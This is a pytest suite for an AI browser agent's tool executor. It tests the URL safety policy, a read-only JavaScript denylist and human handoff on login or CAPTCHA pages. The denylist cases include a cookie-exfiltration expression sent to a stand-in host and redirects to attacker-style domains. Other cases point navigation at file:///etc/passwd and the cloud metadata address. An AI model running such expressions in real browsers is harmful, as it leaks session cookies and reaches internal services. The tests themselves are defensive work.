    """C3b：点击把页面带去 DNS 失败的地址 → 页面停在 ``chrome-error://chromewebdata/``。

    这是**导航失败**（DNS 失败/连接被拒，P4 高频），不是策略违规：旧行为把错误页的 scheme
    拿去 validate → ``protocol_blocked`` + ``navigation_blocked`` + 把真实网络故障记成
    "安全策略拦截"（错误归因全错）。错误页按既有 F4 约定 **discard**（不 release、不 quarantine）。
    """
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/start"})
    page.click_url = "chrome-error://chromewebdata/"
    page.fail_click = True
    page.fail_locator_evaluate = True

    result = await ex.call("browser_click", {"ref": "e2"})

    assert result.status == "error"
    assert result.error_type == "navigation_failed"
    assert "错误页" in result.error_message
    assert result.data["action"] == "browser_click"
    assert result.data["page_discarded"] is True
    assert browser.released == []  # 错误页不回 idle（会被下一个消费者取走）
    assert browser.discarded == [page]
    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"


@pytest.mark.asyncio
async def test_execute_js_into_a_browser_error_page_is_navigation_failure():
    """C3b 同一条修正对 JS 跳转同样成立：错误页 ≠ 策略违规（错的是网络，不是安全门）。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.evaluate_url = "chrome-error://chromewebdata/"

    result = await ex.call("browser_execute_js", {"expression": "document.location.href"})

    assert result.status == "error"
    assert result.error_type == "navigation_failed"
    assert result.data["action"] == "browser_execute_js"
    assert browser.released == []
    assert browser.discarded == [page]


@pytest.mark.asyncio
async def test_blank_page_after_an_action_is_not_a_policy_violation():
    """空白页（``about:blank``，新建页面的初始状态）既不是跳转也不是违规 —— 放行、不弃用。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.evaluate_url = "about:blank"

    result = await ex.call("browser_execute_js", {"expression": "document.title"})

    assert result.status == "success"  # 动作本身的结果原样返回
    assert browser.discarded == []
    assert browser.released == []
    assert (await ex.call("browser_snapshot", {})).status == "success"


@pytest.mark.asyncio
async def test_snapshot_entry_rechecks_the_current_page_url():
    """I1：snapshot 入口也复查当前页 URL——不看一眼就可能一直在违规页上取快照。

    违规页（这里的 file:// 是覆盖范围外的路径带出去的）同样按 navigation_blocked + discard 处理。
    """
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.url = "file:///etc/passwd"  # 覆盖范围外的路径把页面带出去（测试缝）

    result = await ex.call("browser_snapshot", {})

    assert result.status == "error"
    assert result.error_type == "navigation_blocked"
    assert "protocol_blocked" in result.error_message
    assert result.data["action"] == "browser_snapshot"
    assert browser.discarded == [page]
    assert browser.released == []


@pytest.mark.asyncio
async def test_snapshot_entry_allows_a_blank_page():
    """负对照：``about:blank``（新建页面的初始状态）在入口复查里放行。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.url = "about:blank"

    result = await ex.call("browser_snapshot", {})

    assert result.status == "success"
    assert browser.discarded == []


@pytest.mark.asyncio
async def test_browser_type_is_revalidated_before_returning():
    """I1：type 走 JS 赋值兜底时同样能把页面带出去 → 返回前必须复查 URL。

    （入参把关只挡 URL 参数；type 的参数是文本，页面上会发生什么只有动作后才知道。）
    """
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.fail_fill = True  # Playwright 尝试全失败 → JS 赋值兜底
    page.js_fallback_url = "file:///etc/passwd"  # 兜底的 JS 把页面带出去

    result = await ex.call("browser_type", {"ref": "e2", "text": "hello"})

    assert result.status == "error"
    assert result.error_type == "navigation_blocked"
    assert "protocol_blocked" in result.error_message
    assert result.data["action"] == "browser_type"
    assert browser.discarded == [page]
    assert browser.released == []


@pytest.mark.asyncio
async def test_browser_type_into_the_same_page_still_succeeds():
    """负对照：type 没把页面带出去 → 结果原样成功（复查不改变动作结果）。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})

    result = await ex.call("browser_type", {"ref": "e2", "text": "hello"})

    assert result.status == "success"
    assert browser.discarded == []


@pytest.mark.asyncio
async def test_browser_click_same_domain_navigation_still_succeeds():
    """负对照：点击后的同域跳转（合法）照常成功，且不触发隔离。"""
    page = FakePage()
    page.click_url = "https://example.com/next"
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "success"
    assert result.data["url"] == "https://example.com/next"
    assert browser.released == []
    assert (await ex.call("browser_snapshot", {})).status == "success"


@pytest.mark.asyncio
async def test_execute_js_navigation_is_revalidated_when_the_denylist_misses():
    """静态黑名单是 best-effort（不是沙箱）：漏网的表达式真把页面带出去时，动作后复查兜底。"""
    page = FakePage()
    page.evaluate_url = "http://169.254.169.254/latest/meta-data/"
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_execute_js", {"expression": "document.title"})
    assert result.status == "error"
    assert result.error_type == "navigation_blocked"
    assert "private_address_blocked" in result.error_message
    assert result.data["action"] == "browser_execute_js"
    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"


# ── execute_js（只读 + 截断） ────────────────────────────────────────────────


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "expression",
    [
        "document.title",
        "document.querySelectorAll('a').length",
        "JSON.stringify({u: location.href, t: document.title})",
        "document.body.innerText",
    ],
)
async def test_execute_js_allows_read_only_extraction(expression):
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_execute_js", {"expression": expression})
    assert result.status == "success"
    assert ("evaluate", expression) in page.calls
    assert result.data["result"] == "Example Domain"


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "expression",
    [
        "fetch('/api/delete')",
        "document.cookie = 'k=v'",
        "document.body.innerHTML = '<b>x</b>'",
        "localStorage.setItem('k', 'v')",
        "location.href = 'https://evil.example/'",
        "window.open('https://evil.example/')",
        "document.querySelector('form').submit()",
        "document.querySelector('button').click()",
        "eval('1+1')",
        "new Function('return 1')()",
        "navigator.clipboard.writeText('x')",
        # I2 评审探针：旧黑名单漏掉的写法
        "location.assign('https://evil.example/')",
        "location.replace('/next')",
        "document.forms[0].requestSubmit()",
        "document.body.textContent='x'",
        "new Image().src='http://evil.invalid/?c='+document.cookie",
        "window['fetch']('/api/delete')",
    ],
)
async def test_execute_js_blocks_write_expressions(expression):
    """D1「execute_js 仅读」落地：写操作静态拒（best-effort 黑名单，见 executor docstring）。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    result = await ex.call("browser_execute_js", {"expression": expression})
    assert result.status == "error"
    assert result.error_type == "read_only_violation"
    assert not [call for call in page.calls if call[0] == "evaluate"]  # 拒绝路径不执行


@pytest.mark.asyncio
async def test_execute_js_rejects_missing_or_non_str_expression():
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    for arguments in ({}, {"expression": None}, {"expression": 42}, {"expression": "   "}):
        result = await ex.call("browser_execute_js", arguments)
        assert result.status == "error"
        assert result.error_type == "invalid_expression"
    assert not [call for call in page.calls if call[0] == "evaluate"]


@pytest.mark.asyncio
async def test_execute_js_allows_read_only_string_replace():
    """命名决策：黑名单只拦 ``location.assign/replace``，不连坐字符串的 ``.replace(...)``。

    只读提取里 ``document.body.innerText.replace(...)`` 是常用写法；用“点号开头的
    assign/replace 调用”一刀切会把正常提取也拒了（``arr.join('').replace(…)`` 这类链式调用同理）。
    """
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call(
        "browser_execute_js", {"expression": "document.body.innerText.replace('a', 'b')"}
    )
    assert result.status == "success"


@pytest.mark.asyncio
async def test_execute_js_truncates_before_state():
    page = FakePage(js_result="x" * (MAX_JS_RESULT_CHARS + 50))
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_execute_js", {"expression": "document.body.innerText"})
    assert result.status == "success"
    assert len(result.content) == MAX_JS_RESULT_CHARS
    assert result.data["result"] == result.content
    assert result.data["truncated"] is True


@pytest.mark.asyncio
async def test_execute_js_serialises_non_string_results():
    page = FakePage(js_result={"title": "Example", "links": 3})
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_execute_js", {"expression": "(() => ({title: document.title}))()"})
    assert result.status == "success"
    assert json.loads(result.content) == {"title": "Example", "links": 3}
    assert result.data["truncated"] is False


@pytest.mark.asyncio
async def test_execute_js_failure_is_structured():
    page = FakePage()
    page.fail_evaluate = True
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_execute_js", {"expression": "document.title"})
    assert result.status == "error"
    assert result.error_type == "evaluate_failed"
    assert "ReferenceError" in result.error_message


@pytest.mark.asyncio
async def test_browser_call_with_broken_arguments_never_raises():
    """守护"失败即数据"：即使入参形状超纲（None），也要结构化错误而不是异常冒泡。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", None)  # type: ignore[arg-type]
    assert result.status == "error"
    assert result.error_type == "browser_error"


# ── D5/D6：动作后登录/验证码检测 → HITL 载荷 ─────────────────────────────────


def _hitl_payload(result) -> dict:
    """结果里的 HITL 三兄弟（graph.execute 只读前两个，第三个给 trace/前端）。"""
    return {key: result.data[key] for key in ("needs_human", "human_prompt", "intervention")}


# ── F1（T5 审查）：只采样**渲染后可见文本**，原始 HTML 里的隐藏标记不算 ──────


@pytest.mark.asyncio
async def test_detection_samples_visible_text_not_raw_html():
    """采样的**本侧**边界（:func:`_sample_html`）：``body.inner_text()`` 而不是 ``page.content()``。

    原始 HTML 里躺着用户根本看不见的东西（``display:none`` 的隐藏登录下拉、``<script>``、
    i18n bundle）：它们出现在源码里不代表页面上看得见，而关键词规则判的是“用户看见了什么”。
    """
    from browsepilot.app.executor import _sample_html

    page = FakePage(html="<p>验证码</p>", visible_text="Product Detail 商品详情")
    sample = await _sample_html(page)
    assert sample == "product detail 商品详情"  # 取自 visible_text（且已小写）
    assert ("inner_text", "body") in page.calls
    assert ("content",) not in page.calls  # 原始 HTML 绝不进检测


@pytest.mark.asyncio
async def test_hidden_login_markup_does_not_trigger_hitl():
    """F1 实例（T5 审查）：可见「登录」导航链接 + ``display:none`` 的账号/密码下拉。

    旧接线采样原始 HTML（``page.content()``）：入口词「登录」与凭据词「账号/密码」同时出现
    → 误报 HITL，而每次运行只有一次人工暂停机会。新接线只喂渲染后可见文本 → 只剩入口词，
    没有凭据词 → 不命中任何规则（也不置 ``intervention``）。
    """
    page = FakePage(html=HIDDEN_LOGIN_HTML, visible_text=HIDDEN_LOGIN_TEXT, password_inputs=0)
    result = await make_executor(FakeBrowser(page)).call(
        "browser_open", {"url": "https://example.com/product/42"}
    )
    assert result.status == "success"
    assert "needs_human" not in result.data
    assert "intervention" not in result.data
    assert ("content",) not in page.calls
    # 反证：同一份原始 HTML 喂给检测器确实会命中（说明本用例不是“什么都没发生”）——
    # 所以“喂可见文本”这条接线本身就是修复点（检测器是纯函数，分不出字符串的来源）。
    assert (
        detect_intervention(
            url="https://example.com/product/42",
            html_sample=HIDDEN_LOGIN_HTML,
            has_password=False,
        )
        is not None
    )


@pytest.mark.asyncio
async def test_visible_captcha_text_still_triggers_hitl():
    """F1 对照组：换成可见文本不等于放弃检测——页面上看得见的验证码文案照样命中。"""
    page = FakePage(html=DEFAULT_HTML, visible_text=CAPTCHA_TEXT, password_inputs=0)
    result = await make_executor(FakeBrowser(page)).call(
        "browser_open", {"url": "https://example.com/checkout"}
    )
    assert result.data["needs_human"] is True
    assert result.data["intervention"] == "captcha"
    assert ("inner_text", "body") in page.calls


# ── F2（T5 审查）：置信度真正决定要不要暂停 HITL ──────────────────────────


@pytest.mark.asyncio
async def test_medium_confidence_intervention_is_recorded_but_does_not_pause():
    """F2：``medium`` = 文本弱标记（中文关键词组 / 验证码品牌词）——只记录，不暂停。

    每次运行只有一次人工暂停机会（``graph._route_execute_result`` 在
    ``hitl_triggered_count > 0`` 后不再转 hitl），弱信号（帮助页文案、页脚品牌词）不该把它花掉；
    命中仍进 ``data``，trace / 前端能看到“命中过但没暂停”。
    """
    page = FakePage(visible_text="登录 账号 密码", password_inputs=0)  # 入口词 + 凭据词 = medium
    result = await make_executor(FakeBrowser(page)).call(
        "browser_open", {"url": "https://example.com/p"}
    )
    assert result.status == "success"
    assert result.data["intervention"] == "login"
    assert "needs_human" not in result.data  # 图不转 hitl
    assert "human_prompt" not in result.data


@pytest.mark.asyncio
async def test_high_confidence_intervention_still_pauses():
    """F2 对照组：``high``（URL 登录标记 / 密码框 / 验证码短语）照旧暂停等人工。"""
    page = FakePage(visible_text="请输入验证码", password_inputs=0)
    result = await make_executor(FakeBrowser(page)).call(
        "browser_open", {"url": "https://example.com/p"}
    )
    assert result.status == "success"
    assert result.data["needs_human"] is True
    assert result.data["intervention"] == "captcha"


@pytest.mark.asyncio
async def test_browser_open_on_login_page_carries_hitl_payload():
    """D5：动作后落在登录墙 → 挂 needs_human（graph.execute 见它即转 hitl 节点 interrupt）。"""
    page = FakePage(html=LOGIN_HTML, visible_text=LOGIN_TEXT, password_inputs=1)
    page.redirect_url = "https://example.com/login"  # 入参合法，站点把页面重定向到登录页
    browser = FakeBrowser(page)
    result = await make_executor(browser).call(
        "browser_open", {"url": "https://example.com/orders"}
    )
    assert result.status == "success"
    assert _hitl_payload(result) == {
        "needs_human": True,
        "human_prompt": "需要人工处理：检测到登录页面，请在浏览器中手动登录后继续任务。",
        "intervention": "login",
    }
    # HITL 载荷是**附加**：动作自己的 data 一个不少
    assert result.data["url"] == "https://example.com/login"
    assert result.data["status"] == 200


@pytest.mark.asyncio
async def test_browser_open_on_normal_page_has_no_needs_human_key():
    """负对照：普通页面绝不挂 needs_human（每次误报都要用掉唯一的人工暂停机会）。"""
    result = await make_executor(FakeBrowser(FakePage())).call(
        "browser_open", {"url": "https://example.com/"}
    )
    assert result.status == "success"
    assert "needs_human" not in result.data
    assert "human_prompt" not in result.data


@pytest.mark.asyncio
async def test_browser_click_on_captcha_page_carries_hitl_payload():
    """D5：点击后页面变成人机验证 → needs_human（intervention=captcha）。"""
    page = FakePage(html=CAPTCHA_HTML, visible_text=CAPTCHA_TEXT)
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "success"
    assert result.data["needs_human"] is True
    assert result.data["intervention"] == "captcha"
    assert "验证" in result.data["human_prompt"]


@pytest.mark.asyncio
async def test_browser_type_into_login_form_carries_hitl_payload():
    """D5：输入之后落在登录表单 → needs_human；动作本身照常完成（先清空再填）。"""
    page = FakePage(html=LOGIN_HTML, visible_text=LOGIN_TEXT, password_inputs=1)
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    result = await ex.call("browser_type", {"ref": "e2", "text": "13800000000"})
    assert result.status == "success"
    assert result.data["needs_human"] is True
    assert result.data["intervention"] == "login"
    assert ("fill", "aria-ref=e2", "13800000000") in page.calls
    # 只认**可见**密码框：真实页面里 DOM 中藏着 display:none 的登录弹窗很常见，
    # 把“DOM 里存在”当“页面上要登录”会直接误报（D5 保守优先）
    assert ("count", "input[type=password]:visible") in page.calls


@pytest.mark.asyncio
async def test_detection_failure_never_breaks_the_action():
    """检测是 best-effort：content()/密码框探测抛错 → 当作“没发现”，动作结果原样可用。"""
    page = FakePage(html=LOGIN_HTML, visible_text=LOGIN_TEXT, password_inputs=1)
    page.fail_inner_text = True
    page.fail_password_count = True
    browser = FakeBrowser(page)
    result = await make_executor(browser).call("browser_open", {"url": "https://example.com/"})
    assert result.status == "success"
    assert "needs_human" not in result.data
    assert result.data["requested_url"] == "https://example.com/"


@pytest.mark.asyncio
async def test_failed_action_on_login_page_keeps_its_own_status():
    """失败即数据：error 结果只补 needs_human，不改状态/错误字段。

    图端只在 success 上转 hitl（graph.execute），所以错误路径上的 flag 是诊断信息：
    降级链照常继续——绝不把一次失败的点击伪装成“需要人工”的成功。
    """
    page = FakePage(html=LOGIN_HTML, visible_text=LOGIN_TEXT, password_inputs=1)
    page.fail_click = True
    page.fail_locator_evaluate = True
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "error"
    assert result.error_type == "timeout"
    assert result.data["needs_human"] is True
    assert result.data["attempts"] == 3  # 动作自己的 data 仍在


@pytest.mark.asyncio
async def test_click_navigation_out_of_policy_wins_over_intervention():
    """落点在策略外时返回拦截结果（不是 HITL 载荷）：安全门先于人工桥。"""
    page = FakePage(html=LOGIN_HTML, visible_text=LOGIN_TEXT, password_inputs=1)
    page.click_url = "file:///etc/passwd"
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "error"
    assert result.error_type == "navigation_blocked"
    assert "needs_human" not in result.data


@pytest.mark.asyncio
async def test_browser_open_navigation_failure_is_not_sampled():
    """导航失败时页面停在浏览器错误页：不采样、不检测（错误页上没有“需要人工”的信号）。"""
    page = FakePage(html=LOGIN_HTML, visible_text=LOGIN_TEXT, password_inputs=1)
    page.fail_goto = True
    browser = FakeBrowser(page)
    result = await make_executor(browser).call("browser_open", {"url": "https://example.com/down"})
    assert result.error_type == "navigation_failed"
    assert "needs_human" not in result.data
    assert not [call for call in page.calls if call[0] in ("content", "inner_text")]


@pytest.mark.asyncio
async def test_observation_tools_do_not_run_detection():
    """只有 open/click/type 做检测：snapshot/scroll 不采样（采样要在动作之后才有意义）。"""
    page = FakePage(html=LOGIN_HTML, visible_text=LOGIN_TEXT, password_inputs=1)
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    await ex.call("browser_snapshot", {})
    await ex.call("browser_scroll", {"direction": "down"})
    # 既不读可见文本，也不读原始 HTML（旧接线）——更不做密码框探测
    assert not [call for call in page.calls if call[0] in ("content", "inner_text", "count")]


@pytest.mark.asyncio
async def test_visible_text_sample_is_truncated_and_lowercased_before_matching():
    """采样的**本侧**边界（:func:`_sample_html`）：先截到 20KB 再小写。

    为什么单独测这个私有缝：``detect_intervention`` 自己也会截断，所以端到端测试
    （:func:`test_visible_text_sample_is_bounded_to_20kb`）分不出 executor 有没有截——
    而这里确实需要它：把可能上 MB 的可见文本 ``lower()`` 是纯浪费（复制全串）。
    """
    from browsepilot.app.executor import _sample_html

    page = FakePage(visible_text="A" * (MAX_HTML_SAMPLE_CHARS * 2))
    sample = await _sample_html(page)
    assert len(sample) == MAX_HTML_SAMPLE_CHARS
    assert sample == sample.lower()
    assert ("inner_text", "body") in page.calls


@pytest.mark.asyncio
async def test_visible_text_sample_is_bounded_to_20kb():
    """采样有界（教训 §4）：标记落在第 20KB 之后就不算命中，超大页面不会拖慢动作。"""
    page = FakePage(visible_text="x" * MAX_HTML_SAMPLE_CHARS + "验证码")
    result = await make_executor(FakeBrowser(page)).call(
        "browser_open", {"url": "https://example.com/"}
    )
    assert result.status == "success"
    assert "needs_human" not in result.data
